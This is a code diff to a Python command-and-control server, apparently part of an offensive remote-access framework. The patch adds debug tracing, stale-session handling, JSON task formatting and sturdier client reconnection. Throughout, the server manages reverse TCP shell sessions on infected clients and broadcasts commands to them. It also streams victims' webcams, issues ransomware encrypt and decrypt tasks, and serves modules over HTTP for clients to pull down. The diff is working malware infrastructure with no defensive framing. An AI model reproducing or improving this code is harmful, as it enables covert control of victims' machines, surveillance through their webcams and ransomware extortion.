@@ -14,6 +14,7 @@ import socket
 import struct
 import base64
 import random
+import inspect
 import logging
 import argparse
 import datetime
@@ -35,7 +36,7 @@ import core.security as security
 # globals
 __threads = {}
 __abort = False
-__debug = bool('--debug' in sys.argv)
+__debug = False
 __banner__ = """ 
 
 88                                  88
@@ -98,6 +99,12 @@ def main():
         nargs=3,
         help='FTP hostname username password')
 
+    parser.add_argument(
+        '--debug',
+        action='store_true',
+        help='Additional logging'
+    )
+
     modules = os.path.abspath('modules')
     packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
     
@@ -107,7 +114,9 @@ def main():
 
     packages = packages[0]
     options = parser.parse_args()
+    __debug = options.debug
 
+    globals()['debug'] = __debug
     globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
     globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
@@ -307,7 +316,7 @@ class C2():
         :param str code:    Python code to execute
         
         """
-        if globals()['__debug']:
+        if globals()['debug']:
             try:
                 print eval(code)
             except Exception as e:
@@ -324,8 +333,11 @@ class C2():
         globals()['module_handler'].terminate()
         if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
             for session in self.sessions.values():
-                session._active.set()
-                session.send_task('passive')
+                if isinstance(session, Session):
+                    try:
+                        session._active.set()
+                        session.send_task({"task": "passive"})
+                    except: pass
         globals()['__abort'] = True
         self._active.clear()
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
@@ -403,7 +415,7 @@ class C2():
         util.display('prompt color/style: ', color='white', style='normal', end=',')
         util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())), color=self._prompt_color, style=self._prompt_style)
         util.display('debug: ', color='white', style='normal', end=',')
-        util.display('True\n' if globals()['__debug'] else 'False\n', color='green' if globals()['__debug'] else 'red', style='normal')
+        util.display('True\n' if globals()['debug'] else 'False\n', color='green' if globals()['debug'] else 'red', style='normal')
 
     def set(self, args=None):
         """ 
@@ -434,11 +446,11 @@ class C2():
                     if args:
                         setting = args[0]
                         if setting.lower() in ('0','off','false','disable'):
-                            globals()['__debug'] = False
+                            globals()['debug'] = False
                         elif setting.lower() in ('1','on','true','enable'):
-                            globals()['__debug'] = True
-                        util.display("\n[+]" if globals()['__debug'] else "\n[-]", color='green' if globals()['__debug'] else 'red', style='normal', end=',')
-                        util.display("Debug: {}\n".format("ON" if globals()['__debug'] else "OFF"), color='white', style='bright')
+                            globals()['debug'] = True
+                        util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=',')
+                        util.display("Debug: {}\n".format("ON" if globals()['debug'] else "OFF"), color='white', style='bright')
                         return
                 for setting, option in arguments.kwargs.items():
                     option = option.upper()
@@ -472,6 +484,8 @@ class C2():
         :param int id:   session ID
         
         """
+        if globals()['debug']:
+            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         lock = self.current_session._lock if self.current_session else self._lock
         tasks = self.database.get_tasks()
         with lock:
@@ -487,8 +501,10 @@ class C2():
         :param str command:   command to broadcast
 
         """
+        if globals()['debug']:
+            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         sessions = self.sessions.values()
-        send_tasks = [session.send_task(command) for session in sessions]
+        send_tasks = [session.send_task({"task": command}) for session in sessions]
         recv_tasks = {session: session.recv_task() for session in sessions}
         for session, task in recv_tasks.items():
             if isinstance(task, dict) and task.get('task') == 'prompt' and task.get('result'):
@@ -520,7 +536,7 @@ class C2():
                     port = random.randint(6000,9999)
                     s.bind(('0.0.0.0', port))
                     s.listen(1)
-                    cmd = 'webcam stream {}'.format(port)
+                    cmd = {"task": 'webcam stream {}'.format(port)}
                     client.send_task(cmd)
                     conn, addr = s.accept()
                     break
@@ -551,7 +567,7 @@ class C2():
                 cv2.destroyAllWindows()
                 result = 'Webcam stream ended'
         else:
-            client.send_task("webcam %s" % args)
+            client.send_task({"task": "webcam %s" % args})
             task = client.recv_task()
             result = task.get('result')
         util.display(result)
@@ -579,48 +595,55 @@ class C2():
             return filename
 
 
-    def session_remove(self, session):
+    def session_remove(self, session_id):
         """ 
         Shutdown client shell and remove client from database
 
         `Requires`
-        :param int session:   session ID
+        :param int session_id:   session ID
 
         """
-        if not str(session).isdigit() or int(session) not in self.sessions:
+        if globals()['debug']:
+            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
+        if not str(session_id).isdigit() or int(session_id) not in self.sessions:
             return
+        elif str(session_id).isdigit() and int(session_id) in self.sessions and not isinstance(self.sessions[int(session_id)], Session):
+            session = self.sessions[int(session_id)]
+            util.display("Session '{}' is stale (Awaiting Connection)".format(session_id))
+            _ = self.sessions.pop(int(session_id), None)
+            self.database.update_status(session['info']['uid'], 0)
+            with self._lock:
+                util.display('Session {} expunged'.format(session_id))
+            self._active.set()
+            return self.run()
         else:
             # select session
-            session = self.sessions[int(session)]
+            session = self.sessions[int(session_id)]
             session._active.clear()
             # send kill command to client
-            session.send_task({"task": "kill", "session": session.info.get('uid')})
-            # shutdown the connection
-            session.connection.shutdown(socket.SHUT_RDWR)
-            session.connection.close()
-            # update current sessions
-            _ = self.sessions.pop(int(session), None)
+            try:
+                session.send_task({"task": "kill", "session": session.info.get('uid')})
+                # shutdown the connection
+                session.connection.shutdown(socket.SHUT_RDWR)
+                session.connection.close()
+                # update current sessions
+            except: pass
+            _ = self.sessions.pop(int(session_id), None)
             # update persistent database
-            self.database.update_status(self.info.get('uid'), 0)
-            util.display(self._text_color + self._text_style)
-            if not self.current_session:
-                with self._lock:
-                    util.display('Session {} disconnected'.format(session))
-                self._active.set()
-                session._active.clear()
-                return self.run()
-            elif int(session) == self.current_session.session:
+            self.database.update_status(session.info.get('uid'), 0)
+            if self.current_session != None and int(session_id) != self.current_session.info.get('id'):
                 with self.current_session._lock:
-                    util.display('Session {} disconnected'.format(session))
+                    util.display('Session {} disconnected'.format(session_id))
                 self._active.clear()
                 self.current_session._active.set()
                 return self.current_session.run()
             else:
+                self.current_session = None
                 with self._lock:
-                    util.display('Session {} disconnected'.format(session))
-                self._active.clear()
-                self.current_session._active.set()
-                return self.current_session.run()
+                    util.display('Session {} disconnected'.format(session_id))
+                self._active.set()
+                session._active.clear()
+                return self.run()
 
     def session_list(self, verbose=True):
         """ 
@@ -630,6 +653,8 @@ class C2():
         :param str verbose:   verbose output (default: False)
 
         """
+        if globals()['debug']:
+            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         lock = self.current_session._lock if self.current_session else self._lock
         with lock:
             print
@@ -647,9 +672,9 @@ class C2():
         """
         if self.current_session:
             if 'decrypt' in str(args):
-                self.current_session.send_task("ransom decrypt %s" % key.exportKey())
+                self.current_session.send_task({"task": "ransom decrypt %s" % key.exportKey()})
             elif 'encrypt' in str(args):
-                self.current_session.send_task("ransom %s" % args)
+                self.current_session.send_task({"task": "ransom %s" % args})
             else:
                 util.log("Error: invalid option '%s'" % args)
         else:
@@ -663,14 +688,18 @@ class C2():
         :param int session:   session ID
 
         """
+        if globals()['debug']:
+            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         if not str(session).isdigit() or int(session) not in self.sessions:
-            util.log("Session '{}' does not exist".format(session))
+            util.display("Session {} does not exist".format(session))
+        elif str(session).isdigit() and int(session) in self.sessions and not isinstance(self.sessions[int(session)], Session):
+            util.display("Session {} is stale (Awaiting Connection)".format(session))
         else:
             self._active.clear()
             if self.current_session:
                 self.current_session._active.clear()
             self.current_session = self.sessions[int(session)]
-            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(self.current_session.id), color='white', style='normal')
+            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(session), color='white', style='normal')
             self.current_session._active.set()
             return self.current_session.run()
 
@@ -682,34 +711,51 @@ class C2():
         :param int session:   session ID
 
         """
+        if globals()['debug']:
+            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         if not session:
             if self.current_session:
                 self.current_session._active.clear()
+        elif str(session).isdigit() and int(session) in self.sessions and not isinstance(self.sessions[int(session)], Session):
+            util.display("Session {} is stale (Awaiting Connection)".format(session))
         elif str(session).isdigit() and int(session) in self.sessions:
             self.sessions[int(session)]._active.clear()
         self.current_session = None
         self._active.set()
+        return self.run()
 
     @util.threaded
     def serve_until_stopped(self):
         self.database = database.Database(self._database)
+        for session in self.database.get_sessions(verbose=True):
+            self.database.update_status(session.get('uid'), 0)
+            session['online'] = False
+            self.sessions[session.get('id')] = { "info": session, "connection": None }
+        self._count = 1 if not len(self.sessions) else (max(self.sessions.keys()) + 1)
         while True:
             connection, address = self.socket.accept()
             session = Session(connection=connection, id=self._count)
-            util.display("\n\n[+]", color='green', style='bright', end=',')
-            util.display("New Connection:", color='white', style='bright', end=',')
-            util.display(address[0], color='white', style='normal')
-            util.display("    Session:", color='white', style='bright', end=',')
-            util.display(str(self._count), color='white', style='normal')
-            util.display("    Started:", color='white', style='bright', end=',')
-            util.display(time.ctime(session._created) + "\n", color='white', style='normal')
-            info = self.database.handle_session(session.info)
-            if isinstance(info, dict):
-                session.info = info
-            self.sessions[self._count] = session
-            self._count += 1
+            if session.info != None:
+                info = self.database.handle_session(session.info)
+                if isinstance(info, dict):
+                    if info.pop('new', False):
+                        util.display("\n\n[+]", color='green', style='bright', end=',')
+                        util.display("New Connection:", color='white', style='bright', end=',')
+                        util.display(address[0], color='white', style='normal')
+                        util.display("    Session:", color='white', style='bright', end=',')
+                        util.display(str(session.id), color='white', style='normal')
+                        util.display("    Started:", color='white', style='bright', end=',')
+                        util.display(time.ctime(session._created) + "\n", color='white', style='normal')
+                    session.info = info
+                    self.sessions[int(session.id)] = session
+                    self._count += 1
+            else:
+                util.display("\n\n[-]", color='red', style='bright', end=',')
+                util.display("Failed Connection:", color='white', style='bright', end=',')
+                util.display(address[0], color='white', style='normal')
             prompt = self.current_session._prompt if self.current_session else self._prompt
             util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
+            sys.stdout.flush()
             abort = globals()['__abort']
             if abort:
                 break
@@ -719,6 +765,8 @@ class C2():
         Run C2 server administration terminal
 
         """
+        if globals()['debug']:
+            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         self._active.set()
         if 'c2' not in globals()['__threads']:
             globals()['__threads']['c2'] = self.serve_until_stopped()
@@ -774,13 +822,19 @@ class Session(threading.Thread):
         """
         super(Session, self).__init__()
         self._prompt = None
+        self._abort = False
         self._lock = threading.Lock()
         self._active = threading.Event()
         self._created = time.time()
         self.connection = connection
         self.id = id
         self.key = security.diffiehellman(self.connection)
-        self.info = self.recv_task()
+        try:
+            self.info = self.recv_task()
+            self.info['id'] = self.id
+        except Exception as e:
+            self.info = None
+            return
 
     def kill(self):
         """ 
@@ -857,12 +911,17 @@ class Session(threading.Thread):
           :attr datetime completed:  time task was completed by client
 
         """
+        
         header_size = struct.calcsize('!L')
         header = self.connection.recv(header_size)
-        msg_size = struct.unpack('!L', header)[0]
-        msg = self.connection.recv(msg_size)
-        data = security.decrypt_aes(msg, self.key)
-        return json.loads(data)
+        if len(header) == 4:
+            msg_size = struct.unpack('!L', header)[0]
+            msg = self.connection.recv(msg_size)
+            data = security.decrypt_aes(msg, self.key)
+            return json.loads(data)
+        else:
+            # empty header; peer down, scan or recon. Drop.
+            return 0
 
     def run(self):
         """ 
@@ -873,32 +932,35 @@ class Session(threading.Thread):
 #            try:
             if self._active.wait():
                 task = self.recv_task() if not self._prompt else self._prompt
-                if 'help' in task.get('task'):
-                    self._active.clear()
-                    globals()['c2'].help(task.get('result'))
-                    self._active.set()
-                elif 'prompt' in task.get('task'):
-                    self._prompt = task
-                    command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
-                    cmd, _, action  = command.partition(' ')
-                    if cmd in ('\n', ' ', ''):
-                        continue
-                    elif cmd in globals()['c2'].commands and cmd != 'help':
-                        result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
-                        if result:
-                            task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
-                            globals()['c2'].display(result.encode())
+                if isinstance(task, dict):
+                    if 'help' in task.get('task'):
+                        self._active.clear()
+                        globals()['c2'].help(task.get('result'))
+                        self._active.set()
+                    elif 'prompt' in task.get('task'):
+                        self._prompt = task
+                        command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
+                        cmd, _, action  = command.partition(' ')
+                        if cmd in ('\n', ' ', ''):
+                            continue
+                        elif cmd in globals()['c2'].commands and cmd != 'help':
+                            result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
+                            if result:
+                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
+                                globals()['c2'].display(result.encode())
+                                globals()['c2'].database.handle_task(task)
+                            continue
+                        else:
+                            task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
+                            self.send_task(task)
+                    elif 'result' in task:
+                        if task.get('result') and task.get('result') != 'None':
+                            globals()['c2'].display(task.get('result').encode())
                             globals()['c2'].database.handle_task(task)
-                        continue
-                    else:
-                        task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
-                        self.send_task(task)
-                elif 'result' in task:
-                    if task.get('result') and task.get('result') != 'None':
-                        globals()['c2'].display(task.get('result').encode())
-                        globals()['c2'].database.handle_task(task)
                 else:
                     if self._abort:
+                        break
+                    elif isinstance(task, int) and task == 0:
                         break
                 self._prompt = None
 #            except Exception as e:
